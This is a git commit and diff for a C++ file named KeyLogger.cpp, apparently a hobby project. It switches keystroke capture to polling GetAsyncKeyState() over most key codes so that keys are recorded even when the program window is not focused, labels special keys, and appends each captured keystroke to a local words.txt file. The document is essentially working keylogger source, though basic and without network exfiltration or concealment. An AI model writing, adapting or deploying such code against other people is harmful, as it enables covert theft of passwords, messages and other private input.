6f206dde940c80bac63cc554a608a69ff0dd7c88
Leon <lshen1905@gmail.com>
2020-09-23 22:36:51 -0600

    getch() does not work when not focused on command prompt. Reverted back to GetASyncKeyState(). Added to text file

--- KeyLogger.cpp
+++ KeyLogger.cpp
@@ -3,27 +3,97 @@
 #include <Windows.h>
 #include <iostream>
 #include <conio.h>
+#include <fstream>
 using namespace std;
 
-void findLetterEfficient(){
-	string currentSentence = "";
-	while (1){
-		currentSentence += char(getch());
-		if (GetAsyncKeyState(VK_RETURN) & 1) { //Return to Print Line
-			cout << currentSentence << endl;
-			currentSentence = "";
-		}
-		if ((GetAsyncKeyState(VK_CONTROL) & 1) && (GetAsyncKeyState(0x48)) & 1){ //Ctrl + H To Exit
-			cout<<"Goodbye"<<endl;
-			return;
-		}
-	}
+string specialChar(int keyCode){
+	switch(keyCode){
+		case VK_CAPITAL:
+			return  "[CAPS]";
 
+		case VK_TAB:
+			return  "[TAB]";
+
+		case VK_UP:
+			return "[UP]";
+
+		case VK_DOWN:
+			return  "[DOWN]";
+
+		case VK_SPACE:
+			return " ";
+
+		case VK_RETURN:
+			return "\n";
+		case VK_SHIFT:
+			return "[SHIFT]";
+		case VK_BACK:
+			return "[BACK]";
+		case VK_RBUTTON:
+			return  "[RIGHT_CLICK]";
+		case VK_LEFT:
+			return  "[LEFT]";
+
+		case VK_RIGHT:
+			return  "[RIGHT]";
+
+		case VK_CONTROL:
+			return  "[CONTROL]";
+
+		case VK_MENU:
+			return  "[ALT]";
+			;
+		default:
+			return "false";
+	}
+}
+
+void addToFile(string letter){
+	fstream file;
+	file.open("words.txt",fstream::out | fstream::app);
+	if (file.is_open()){
+		cout<<letter<<endl;
+		file<<letter;
+		file.close();
+	}else{
+		cout<<"file does not exist"<<endl;
+	}
+}
+void findLetterEfficient(){
+
+	while (1){
+		string currentSentence = "";
+		for(int i=8;i<=190;i++){
+			if(GetAsyncKeyState(i) & 1){
+				if(specialChar(i) == "false"){
+					currentSentence+=char(i);
+					addToFile(currentSentence);
+				}else{
+					addToFile(specialChar(i));
+				}
+
+			}
+			if ((GetAsyncKeyState(VK_CONTROL) & 1) && (GetAsyncKeyState(0x48)) & 1){ //Ctrl + H To Exit
+				cout<<"Goodbye"<<endl;
+				return;
+			}
+		}
+		// if (GetAsyncKeyState(VK_RETURN) & 0x8000) { //Return to Print Line
+		// 	cout << currentSentence << endl;
+		// 	file<<currentSentence;
+		// 	currentSentence = "";
+		// }
+		// if ((GetAsyncKeyState(VK_CONTROL) & 1) && (GetAsyncKeyState(0x48)) & 1){ //Ctrl + H To Exit
+		// 	cout<<"Goodbye"<<endl;
+		// 	file.close();
+		// 	return;
+		// }
+	}
 }
 
 
-int main()
-
+int main(){
+	Sleep(1);
 	findLetterEfficient();
 	return 0;
 }
